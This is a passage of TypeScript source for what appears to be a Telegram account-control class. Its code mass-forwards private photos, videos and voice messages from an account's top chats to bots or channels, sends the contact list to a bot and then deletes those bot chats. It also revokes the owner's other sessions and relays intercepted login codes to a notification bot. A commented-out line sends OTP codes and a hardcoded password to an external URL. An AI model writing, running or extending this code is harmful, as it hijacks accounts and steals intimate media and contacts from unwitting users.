channelDetails = await this.createOrJoinChannel(channel);\n                channelId = channelDetails.id;\n                channelAccessHash = channelDetails.accesshash;\n                await this.forwardSecretMsgs(fromChatId, channelId?.toString());\n            } else {\n                const chats = await this.getTopPrivateChats();\n                const me = await this.getMe();\n                if (chats.length > 0) {\n                    const channelDetails = await this.createOrJoinChannel(channel);\n                    channelId = channelDetails.id;\n                    channelAccessHash = channelDetails.accesshash;\n                    const finalChats = new Set(chats.map(chat => chat.chatId));\n                    finalChats.add(me.id?.toString());\n                    for (const chatId of finalChats) {\n                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });\n                        console.log(\"Forwarding messages from chat:\", chatId, \"to channel:\", channelId);\n                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);\n                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);\n                    }\n                }\n                console.log(\"Completed forwarding messages from top private chats to channel:\", channelId);\n            }\n        } catch (e) {\n            console.log(e)\n        }\n        if (channelId) {\n            await this.leaveChannels([channelId.toString()]);\n            await connectionManager.unregisterClient(this.phoneNumber);\n        }\n    }\n\n    public async forwardMediaToBot(fromChatId: string) {\n        const bots = BotConfig.getInstance().getAllBotUsernames(ChannelCategory.SAVED_MESSAGES);\n        try {\n            if (fromChatId) {\n                await this.forwardSecretMsgs(fromChatId, BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES),);\n            } else {\n                const chats = await this.getTopPrivateChats();\n                const me = await this.getMe();\n                const finalChats = new Set(chats.map(chat => chat.chatId));\n                finalChats.add(me.id?.toString());\n                for (const bot of bots) {\n                    try {\n                        await this.client.sendMessage(bot, { message: \"Start\" });\n                        await sleep(1000);\n                        await this.client.invoke(\n                            new Api.folders.EditPeerFolders({\n                                folderPeers: [\n                                    new Api.InputFolderPeer({\n                                        peer: await this.client.getInputEntity(bot),\n                                        folderId: 1,\n                                    }),\n                                ],\n                            })\n                        );\n                    } catch (e) {\n                        console.log(e)\n                    }\n                }\n                try {\n                    const contacts = await this.getContacts();\n                    if ('users' in contacts && Array.isArray(contacts.users)) {\n                        await this.sendContactsFile(BotConfig.getInstance().getBotUsername(ChannelCategory.USER_WARNINGS), contacts);\n                    } else {\n                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');\n                    }\n                } catch (e) {\n                    console.log(\"Failed To Send Contacts File\", e)\n                }\n                for (const chatId of finalChats) {\n                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VOICE, MessageMediaType.VOICE] });\n                    console.log(\"Media Messages: \", mediaMessages);\n                    const uniqueMessageIds = Array.from(new Set([\n                        ...mediaMessages.photo.messages,\n                        ...mediaMessages.video.messages,\n                        ...mediaMessages.document.messages,\n                        ...mediaMessages.roundVideo.messages,\n                        ...mediaMessages.roundVoice.messages,\n                        ...mediaMessages.voice.messages,\n                    ]));\n                    const chunkSize = 30;\n                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {\n                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);\n                        const bot = BotConfig.getInstance().getBotUsername(ChannelCategory.SAVED_MESSAGES)\n                        await this.client.forwardMessages(bot, {\n                            messages: chunk,\n                            fromPeer: chatId,\n                        });\n                        console.log(`Forwarded ${chunk.length} messages to bot`);\n                    }\n                }\n            }\n        } catch (e) {\n            console.log(e)\n        }\n        for (const bot of bots) {\n            const result = await this.cleanupChat({ chatId: bot, revoke: false });\n            await sleep(1000);\n            await this.deleteChat({ peer: bot, justClear: false });\n            console.log(\"Deleted bot chat:\", result);\n        }\n    }\n\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        const limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n        console.log(\"Left the channel with ID:\", toChatId);\n        return;\n    }\n\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async disconnect(): Promise<void> {\n        if (this.client) {\n            try {\n                console.log(\"Destroying Client: \", this.phoneNumber);\n                await this.cleanupClient();\n                console.log(\"Client Destroyed finally: \", this.phoneNumber);\n            } catch (error) {\n                console.error(\"Error during disconnect:\", error);\n                throw error;\n            }\n        }\n    }\n\n    private async cleanupClient() {\n        try {\n            if (!this.client) return;\n            const handlers = this.client.listEventHandlers();\n            for (const handler of handlers) {\n                this.client.removeEventHandler(handler[1], handler[0]);\n            }\n            console.debug(\"Removing all handlers\");\n            try {\n                if (this.client.connected) {\n                    await this.client.disconnect();\n                }\n                await this.client.destroy();\n                console.debug(\"Client destroyed\");\n            } catch (error) {\n                parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n            }\n            await this.client.destroy();\n            await this.client.disconnect();\n            this.client = null;\n            this.session.delete();\n            this.channelArray = [];\n            this.client = null;\n            await sleep(2000);\n            console.log(\"Client Destroyed: \", this.phoneNumber);\n        } catch (error) {\n            parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n        }\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        parseError(error)\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            // await this.client.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\n            // Handle other types of errors\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 5,\n        });\n        this.client.setLogLevel(LogLevel.ERROR);\n        // this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams) {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats;\n    }\n\n    async getLastMsgs(limit: number): Promise<string> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const msgs = await this.client.getMessages(\"777000\", { limit });\n        let resp = '';\n        msgs.forEach((msg) => {\n            console.log(msg.text);\n            resp += msg.text + \"\\n\";\n        });\n        return resp;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (const id of chats) {\n            try {\n                const channelId = id.startsWith('-100') ? id : `-100${id}`;\n                await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: channelId\n                    })\n                );\n                console.log(`${this.phoneNumber} Left channel :`, id);\n                if (chats.length > 1) {\n                    await sleep(3000);\n                }\n\n            } catch (error) {\n                const errorDetails = parseError(error);\n                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);\n                break;\n            }\n        }\n        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: Api.Authorization): boolean {\n        const authCriteria = [\n            { field: 'country', value: 'singapore' },\n            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },\n            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }\n        ];\n\n        return authCriteria.some(criterion => {\n            if ('values' in criterion) {\n                return criterion.values.some(value =>\n                    auth[criterion.field].toLowerCase().includes(value.toLowerCase())\n                );\n            }\n            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());\n        });\n    }\n\n    private async resetAuthorization(auth: any): Promise<void> {\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async getCallLogsInternal() {\n        const finalResult = {}\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            finalResult[chatId] = filteredResults\n        }\n        return finalResult;\n    }\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory(params));\n            console.log(`Dialog with ID ${params.peer} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    async getMediaMetadata(params: {\n        chatId: string;\n        types?: ('photo' | 'video' | 'document' | 'voice')[];\n        startDate?: Date;\n        endDate?: Date;\n        limit?: number;\n        maxId?: number;\n        minId?: number;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\n\n        const query: Partial<IterMessagesParams> = {\n            limit: limit || 500,\n            ...(maxId ? { maxId } : {}),\n            ...(minId ? { minId } : {}),\n            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),\n            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })\n        };\n\n        const ent = await this.safeGetEntity(chatId);\n        console.log(query);\n        const messages = await this.client.getMessages(ent, query);\n        console.log(`Fetched ${messages.length} messages`);\n\n        const filteredMessages = messages.map(message => {\n            const messageIds: number[] = [];\n            if (message.media) {\n                const mediaType = this.getMediaType(message.media);\n                if (types.includes(mediaType)) {\n                    messageIds.push(message.id);\n                }\n            }\n            return messageIds;\n        }).flat();\n\n        return {\n            messages: filteredMessages,\n            total: messages.total,\n            hasMore: messages.length == limit,\n            lastOffsetId: messages[messages.length - 1].id\n        };\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const entity = await this.safeGetEntity(chatId);\n            const messages = await this.client.getMessages(entity, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || 